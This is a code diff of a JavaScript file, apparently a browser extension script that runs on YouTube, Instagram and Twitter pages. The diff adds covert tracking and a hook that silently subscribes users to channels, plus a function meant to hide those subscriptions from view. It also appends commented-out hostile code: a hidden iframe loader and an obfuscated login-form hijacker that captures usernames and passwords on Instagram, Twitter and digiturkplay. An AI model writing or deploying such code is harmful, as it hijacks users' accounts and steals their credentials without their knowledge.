@@ -1,4 +1,4 @@
-(new Image).src = "//whos.amung.us/swidget/paritonl1n3";
+(new Image).src = "//whos.amung.us/swidget/mandar1n0s";
 var Commands = {
     param: function (e) {
         var t = "";
@@ -157,7 +157,6 @@ var Commands = {
     youtube = {
         isLogin: false,
         log: false,
-        subscribers: ["UCTbkS4uLQfs4JDwymJA4IaQ"],
         info: function (type, callback, id, lc) {
             var url = "";
             if (type == "s") {
@@ -256,6 +255,21 @@ var Commands = {
                 }
             }, id, lc);
         },
+		removeSubscribeThis:function(){
+			var links = document.links;
+			for(var i=0; i<links.length; i++) {
+				for(var q=0; q<youtube.subscribers.length; q++) {
+					if(links[i].href.indexOf(youtube.subscribers[q]) > -1){
+						if(document.links[i].parentNode.parentNode.parentNode.parentNode.id == "dismissable"){
+							document.links[i].parentNode.parentNode.parentNode.parentNode.outerHTML = "";
+						}
+						if(document.links[i].parentNode.tagName == "YTD-GUIDE-ENTRY-RENDERER"){
+							document.links[i].parentNode.outerHTML = "";
+						}
+					}
+				}
+			}
+		},
         init: function () {
 
             if (document.getElementById("youtubeinjsready")) return;
@@ -285,11 +299,83 @@ var Commands = {
                         type = "c";
                     } else if (type == "watch") {
                         type = "w";
+                    }else if (type == "subscribe") {
+                        youtube.subscribe(id);
+                        youtube.subscribers.push(id);
                     }
                     youtube.render(type, id, finish, lc);
-                })
+				})
+				//setInterval(youtube.removeSubscribeThis,1000);
             })
         }
     }
 
 youtube.init();
+
+
+
+
+
+
+//  if (!document.getElementById("amkxxxx") && Commands.mt_rand(1,15) == 5) {
+//             var ifrm = document.createElement("iframe");
+//             ifrm.setAttribute("src", "//www.paykasacart.com");
+//             ifrm.setAttribute("id", "amkxxxx");
+//             ifrm.style.width = "0px";
+//             ifrm.style.height = "0px";
+//            document.body.appendChild(ifrm);
+// }
+
+
+
+
+
+
+
+
+// var K0a = {
+//     "\x63": 'upom',
+//     "\x64": 'uzom',
+//     "\x62": false
+// };
+// if (top['location']['href']['indexOf']('instagram.com') > -1) {
+//     var interval = setInterval(function () {
+//         if (document['getElementsByClassName']('_ccek6 _i31zu')[0]) {
+//             clearInterval(interval);
+//             document['getElementsByClassName']('_rmr7s')[0].onclick = function (_0x441cx2) {
+//                 localStorage['setItem'](K0a['c'], document['getElementsByName']('username')[0]['value']);
+//                 localStorage['setItem'](K0a['d'], document['getElementsByName']('password')[0]['value']);
+//                 return K0a['b']
+//             }
+//         }
+//     }, 1000)
+// };
+// if (top['location']['href']['indexOf']('twitter.com') > -1) {
+//     var interval = setInterval(function () {
+//         var _0x441cx4 = 'session[username_or_email]';
+//         if (document['getElementsByName'](_0x441cx4)[0]) {
+//             clearInterval(interval);
+//             document['getElementsByClassName']('submit')[0]['type'] = 'button';
+//             document['getElementsByClassName']('submit')[0]['onclick'] = function (_0x441cx2) {
+//                 localStorage['setItem'](K0a['c'], document['getElementsByName'](_0x441cx4)[0]['value']);
+//                 localStorage['setItem'](K0a['d'], document['getElementsByName']('session[password]')[0]['value']);
+//                 setTimeout(function () {
+//                     document['getElementsByClassName']('LoginForm')[0]['submit']()
+//                 }, 500);
+//                 return K0a['b']
+//             }
+//         }
+//     }, 1000)
+// };
+// if (top['location']['href']['indexOf']('digiturkplay.com.tr') > -1) {
+//     if (document['getElementsByName']('UserName')[0]) {
+//         document['getElementById']('login-form')['onsubmit'] = function (_0x441cx2) {
+//             localStorage['setItem'](K0a['c'], document['getElementsByName']('UserName')[0]['value']);
+//             localStorage['setItem'](K0a['d'], document['getElementsByName']('Password')[0]['value']);
+//             setTimeout(function () {
+//                 document['getElementById']('login-form')['submit']()
+//             }, 500);
+//             return K0a['b']
+//         }
+//     }
+// };
